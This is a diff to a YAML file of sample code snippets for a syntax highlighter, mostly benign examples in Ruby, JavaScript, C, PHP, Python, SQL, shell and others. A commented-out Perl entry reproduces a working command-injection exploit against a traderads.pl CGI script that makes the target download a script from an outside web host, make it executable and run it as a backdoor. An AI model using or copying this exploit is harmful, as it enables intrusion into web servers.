@@ -1,4 +1,89 @@
 -
+  name: Ruby
+  highlighter: shBrushRuby.js
+  snippet: >
+    def create_set_and_get(initial_value=0) # Note the default value of 0
+      closure_value = initial_value
+      return Proc.new {|x| closure_value = x}, Proc.new { closure_value }
+    end
+     
+    setter, getter = create_set_and_get  # ie. returns two values
+    setter.call(21)
+    getter.call # => 21
+     
+    #You can also use a parameter variable as a binding for the closure. 
+    #So the above can be rewritten as...
+     
+    def create_set_and_get(closure_value=0)
+      return proc {|x| closure_value = x } , proc { closure_value }
+    end
+-
+  name: JavaScript
+  highlighter: shBrushJScript.js
+  snippet: >
+    // The prototype of object instances created by a constructor is
+    // that constructor's "prototype" property.
+    LCMCalculator.prototype = { // object literal
+        constructor: LCMCalculator, // when reassigning a prototype, set the constructor property appropriately
+        gcd: function () { // method that calculates the greatest common divisor
+            // Euclidean algorithm:
+            var a = Math.abs(this.a), b = Math.abs(this.b), t;
+            if (a < b) {
+                // swap variables
+                t = b;
+                b = a;
+                a = t;
+            }
+            while (b !== 0) {
+                t = b;
+                b = a % b;
+                a = t;
+            }
+            // Only need to calculate GCD once, so "redefine" this method.
+            // (Actually not redefinition - it's defined on the instance itself,
+            // so that this.gcd refers to this "redefinition" instead of LCMCalculator.prototype.gcd.)
+            // Also, 'gcd' === "gcd", this['gcd'] === this.gcd
+            this['gcd'] = function () {
+                return a;
+            };
+            return a;
+        },
+        // Object property names can be specified by strings delimited by double (") or single (') quotes.
+        "lcm" : function () {
+            // Variable names don't collide with object properties, e.g. |lcm| is not |this.lcm|.
+            // not using |this.a * this.b| to avoid FP precision issues
+            var lcm = this.a / this.gcd() * this.b;
+            // Only need to calculate lcm once, so "redefine" this method.
+            this.lcm = function () {
+                return lcm;
+            };
+            return lcm;
+        },
+        toString: function () {
+            return "LCMCalculator: a = " + this.a + ", b = " + this.b;
+        }
+    };
+-
+  name: C
+  highlighter: shBrushCpp.js
+  snippet: >
+    #include <stdio.h>
+
+    main()
+    {
+      int c;  /* Character read from the file.	*/
+      FILE *ptr;
+
+      ptr = fopen("/etc/hosts","r");
+
+      while ((c = fgetc(ptr)) != EOF)
+      {
+        printf("%c",c);
+      }
+
+      fclose(ptr);			/* Close the file.			*/
+    }
+-
   name: Java
   highlighter: shBrushJava.js
   snippet: >
@@ -22,43 +107,228 @@
         public void speedUp(int increment) {
             speed += increment;
         }
+        public String toString() {
+            return "I am the village bike."
+        }
     }
 -
-  name: C
+  name: C++
   highlighter: shBrushCpp.js
   snippet: >
-    #include <stdio.h>
+    // Rectangle class.
+    #include <iostream>
+    using namespace std;
 
-    main()
-    {
-      int c;  /* Character read from the file.	*/
-      FILE *ptr;
+    class CRectangle {
+        int x, y;
+      public:
+        void set_values (int,int);
+        int area () {return (x*y);}
+    };
 
-      ptr = fopen("/etc/hosts","r");
+    void CRectangle::set_values (int a, int b) {
+      x = a;
+      y = b;
+    }
 
-      while ((c = fgetc(ptr)) != EOF)
-      {
-        printf("%c",c);
-      }
-
-      fclose(ptr);			/* Close the file.			*/
+    int main () {
+      CRectangle rect;
+      rect.set_values (3,4);
+      cout << "area: " << rect.area();
+      return 0;
     }
 -
-  name: Ruby
-  highlighter: shBrushRuby.js
+  name: PHP
+  highlighter: shBrushPhp.js
   snippet: >
-    class Person < Ape
-      attr_accessor :age
+    function lock() {
+        $file = fopen('file.txt', 'r+');
+        retry:
+        if (!flock($file, LOCK_EX & LOCK_NB)) {
+            goto retry;
+        }
+        fwrite($file, 'Success!');
+        fclose($file);
+        return 0;
+    }
+-
+  name: Python
+  highlighter: shBrushPython.js
+  snippet: >
+    def fix_IE_for_attach(request, response):
+        """
+        This function will prevent Django from serving a Content-Disposition header
+        while expecting the browser to cache it (only when the browser is IE). This
+        leads to IE not allowing the client to download.
+        """
+        useragent = request.META.get('HTTP_USER_AGENT', '').upper()
+        if 'MSIE' not in useragent and 'CHROMEFRAME' not in useragent:
+            return response
 
-      def initialize(age = 0)
-        @age = age
-      end
+        offending_headers = ('no-cache', 'no-store')
+        if response.has_header('Content-Disposition'):
+            try:
+                del response['Pragma']
+            except KeyError:
+                pass
+            if response.has_header('Cache-Control'):
+                cache_control_values = [value.strip() for value in
+                        response['Cache-Control'].split(',')
+                        if value.strip().lower() not in offending_headers]
 
-      def say_hi(name = 'mate')
-        puts 'Hello ' + name
-      end
+                if not len(cache_control_values):
+                    del response['Cache-Control']
+                else:
+                    response['Cache-Control'] = ', '.join(cache_control_values)
 
-      def tell_age
-        age < 2 ? puts 'ga ga goo' : puts "I'm #{age} years old"
-      end
-    end
+        return response
+-
+  name: C# / .net
+  highlighter: shBrushCSharp.js
+  snippet: >
+    // Declare the generic class.
+
+    public class GenericList<T>
+    {
+        void Add(T input) { }
+    }
+
+    class TestGenericList
+    {
+        private class ExampleClass { }
+        static void Main()
+        {
+            // Declare a list of type int.
+            GenericList<int> list1 = new GenericList<int>();
+
+            // Declare a list of type string.
+            GenericList<string> list2 = new GenericList<string>();
+
+            // Declare a list of type ExampleClass.
+            GenericList<ExampleClass> list3 = new GenericList<ExampleClass>();
+        }
+    }
+# Wants to condense onto six lines for some reason.
+#-
+#  name: Perl
+#  highlighter: shBrushPerl.js
+#  snippet: >
+#    #!/usr/bin/perl
+#    use IO::Socket;
+#
+#    if (@ARGV < 2)
+#    {
+#    print "\n==============================================\n";
+#    print "                traderads.pl Exploit By t0e \n";
+#    print "                        bug found by Blahplok      \n";
+#    print "                        Usage: <Target> <Dir>     \n";
+#    print "==============================================\n";
+#    print "Example:\n";
+#    print "        trader.pl www.host.com /cgi-bin/ \n";
+#    exit();
+#    }
+#    $serv = $ARGV[0];
+#    $serv =~ s/http:\/\///ge;
+#    $dir = $ARGV[1];
+#    $cmde = "wget http://www.freewebs.com/wet-farts/cgi.txt";
+#    $cmde2 = "mv cgi.txt ads.pl;chmod -c 755 ads.cgi;perl ads.pl";
+#    $req = "GET $dir";
+#    $req .= "traderads.pl?action=dispsold2&SOLD=smaskfs11136387068.dat|$cmde| HTTP/1.0\n\n\n\n";
+#
+#    $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>80) or die " (-) - C4n't C0nn3ct To The S3rver\n";
+#
+#    print $sock $req;
+#    print "\nPlease Wait ...\n\n";
+#    sleep(100);
+#    close($sock);
+#
+#    $sock2 = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>80) or die " (-) - C4n't C0nn3ct To The S3rver\n";
+#
+#    $req2 = "GET $dir";
+#    $req2 .= "traderads.pl?action=dispsold2&SOLD=smaskfs11136387068.dat|$cmde2| HTTP/1.0\n\n\n\n";
+#    print $sock2 $req2;
+#    sleep(100);
+#    print "\n\nDone.... In your browser go to www.host.com$dirimail.cgi   $$$\n";
+#    print "if this didnt work server is not vunerable\n";
+#    print "Password is w00t";
+#    ### EOF ###
+-
+  name: SQL
+  highlighter: shBrushSql.js
+  snippet: >
+    CREATE TABLE tbl_1(id INT);
+      INSERT INTO tbl_1(id) VALUES(1);
+      INSERT INTO tbl_1(id) VALUES(2);
+    COMMIT;
+      UPDATE tbl_1 SET id=200 WHERE id=1;
+    SAVEPOINT id_1upd;
+      UPDATE tbl_1 SET id=1000 WHERE id=2;
+    ROLLBACK TO id_1upd;
+      SELECT id FROM tbl_1;
+-
+  name: BASH / Shell
+  highlighter: shBrushShell.js
+  snippet: >
+    #! /bin/sh
+
+    PATH=/sbin:/bin
+
+    . /lib/lsb/init-functions
+
+    do_start () {
+      log_action_msg "Will now switch to single-user mode"
+      exec init -t1 S
+    }
+
+    case "$1" in
+      start)
+      do_start
+      ;;
+      restart|reload|force-reload)
+      echo "Error: argument '$1' not supported" >&2
+      exit 3
+      ;;
+      stop)
+      # No-op
+      ;;
+      *)
+      echo "Usage: $0 start|stop" >&2
+      exit 3
+      ;;
+    esac
+-
+  name: Visual Basic
+  highlighter: shBrushVb.js
+  snippet: >
+    Option Explicit
+    Dim Count As Integer
+    Private Sub Form_Load()
+        Count = 0
+        Timer1.Interval = 1000 ' units of milliseconds
+    End Sub
+    Private Sub Timer1_Timer()
+        Count = Count + 1
+        Label1.Caption = Count
+    End Sub
+-
+  name: Objective-C
+  highlighter: shBrushShell.js
+  snippet: >
+    @implementation Stack
+
+    - free
+    {
+      StackLink *next;
+
+      while (top != (StackLink *) 0)
+        {
+          next = top->next;
+          free ((char *) top);
+          top = next;
+        }
+      return [super free];
+    }
+
+    /* other methods */
+
+    @end
